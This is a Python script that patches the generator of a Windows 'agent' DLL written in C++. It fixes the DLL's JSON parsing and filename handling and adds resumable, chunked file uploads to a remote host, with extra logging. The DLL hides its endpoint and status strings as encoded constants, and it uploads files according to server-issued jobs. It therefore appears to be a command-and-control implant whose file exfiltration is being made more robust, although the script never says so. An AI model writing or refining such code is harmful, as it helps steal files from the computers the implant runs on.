with open('C:/agent-workspace/generate_agent_dll.py', 'r', encoding='utf-8') as f:
    content = f.read()

# Fix 1: add stdlib.h
content = content.replace(
    '#include <stdarg.h>\n',
    '#include <stdarg.h>\n#include <stdlib.h>\n'
)

# Fix 2: replace _json_field
old_json = '''static char* _json_field(const char* json, const char* key) {{
    static char buf[4096];
    size_t klen = strlen(key);
    const char* p = json;
    while(*p) {{
        p = strchr(p, '"'); if(!p) return NULL; p++;
        if(strncmp(p, key, klen) == 0 && p[klen] == '"') {{
            p += klen + 1; if(*p == '"') p++; while(*p && (*p == ' ' || *p == ':')) p++;
            if(*p != '"') return NULL; p++;
            size_t i = 0;
            while(*p && *p != '"' && i < sizeof(buf)-1) {{ buf[i++] = *p; p++; }}
            buf[i] = '\0'; return buf;
        }}
    }}
    return NULL;
}}'''

new_json = '''static char* _json_field(const char* json, const char* key) {{
    static char buf[4096];
    std::string j(json);
    std::string k(1, (char)34);
    k += key;
    k += (char)34;
    size_t pos = j.find(k);
    if(pos == std::string::npos) return NULL;
    size_t start = pos + k.length();
    if(start < j.length() && j[start] == (char)34) start++;
    while(start < j.length() && (j[start] == ' ' || j[start] == ':')) start++;
    if(start >= j.length() || j[start] != (char)34) return NULL;
    start++;
    size_t i = 0;
    while(start < j.length() && j[start] != (char)34 && i < sizeof(buf)-1) {{ buf[i++] = j[start++]; }}
    buf[i] = 0; return buf;
}}'''

content = content.replace(old_json, new_json)

# Fix 3a: basename extraction
old_basename = "char sbn[64]; {{ char* p = strrchr((char*)job->filepath.c_str(), '\\'); s_copy(sbn, _e_s_empty, sizeof(_e_s_empty)); strcat(sbn, p ? p+1 : job->filepath.c_str()); }}"
new_basename = "size_t bn_pos = job->filepath.find_last_of(\"/\\\\\");\n    std::string basename = (bn_pos != std::string::npos) ? job->filepath.substr(bn_pos + 1) : job->filepath;\n    char sbn[256]; s_copy(sbn, _e_s_empty, sizeof(_e_s_empty)); strncat(sbn, basename.c_str(), sizeof(sbn)-1);"
content = content.replace(old_basename, new_basename)

# Fix 3b: remove _log before init_body, add after
old_log = '''    char puc[64]; s_copy(puc, _e_path_upload_chunk, sizeof(_e_path_upload_chunk));
    _log("upload init_body: %s", init_body.c_str());
    std::string init_body ='''
new_log = '''    char puc[64]; s_copy(puc, _e_path_upload_chunk, sizeof(_e_path_upload_chunk));
    std::string init_body ='''
content = content.replace(old_log, new_log)

# Add _log after init_body declaration
old_init = '''    std::string init_body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fct) + "\\":" + std::to_string(total) + "}}";
    std::string resp = _http_json(host, pui, init_body);'''
new_init = '''    std::string init_body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fct) + "\\":" + std::to_string(total) + "}}";
    _log("upload init_body: %s", init_body.c_str());
    std::string resp = _http_json(host, pui, init_body);'''
content = content.replace(old_init, new_init)

# Fix 3c: parse offset from init response and seek
old_init2 = '''    bool inited = false;
    if(!resp.empty()) {{
        char* st = _json_field(resp.c_str(), "status");
        char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
        if(st && strcmp(st, sok) == 0) inited = true;
    }}
    if(!inited) {{ CloseHandle(hFile); _log("upload: init failed"); return; }}
    _log("upload: started %s (%lld bytes)", sbn, total);
    LONGLONG offset = 0;
    int retry_count = 0;'''
new_init2 = '''    bool inited = false;
    LONGLONG offset = 0;
    if(!resp.empty()) {{
        char* st = _json_field(resp.c_str(), "status");
        char sok[8]; s_copy(sok, _e_status_ok, sizeof(_e_status_ok));
        if(st && strcmp(st, sok) == 0) {{
            inited = true;
            char* off_str = _json_field(resp.c_str(), "offset");
            if(off_str) offset = strtoll(off_str, NULL, 10);
        }}
    }}
    if(!inited) {{ CloseHandle(hFile); _log("upload: init failed"); return; }}
    if(offset > 0) {{
        LARGE_INTEGER off; off.QuadPart = offset;
        if(!SetFilePointerEx(hFile, off, NULL, FILE_BEGIN)) {{
            _log("upload: seek failed"); CloseHandle(hFile); return;
        }}
        _log("upload: resuming from offset %lld", offset);
    }}
    _log("upload: started %s (%lld bytes)", sbn, total);
    int retry_count = 0;'''
content = content.replace(old_init2, new_init2)

# Fix 3d: add chunk resp log
old_chunk = '''        resp = _http_json(host, puc, body);
        bool ok = false;'''
new_chunk = '''        resp = _http_json(host, puc, body);
        _log("upload chunk resp: %s", resp.c_str());
        bool ok = false;'''
content = content.replace(old_chunk, new_chunk)

with open('C:/agent-workspace/generate_agent_dll.py', 'w', encoding='utf-8', newline='\n') as f:
    f.write(content)

print('generate_agent_dll.py fixed')

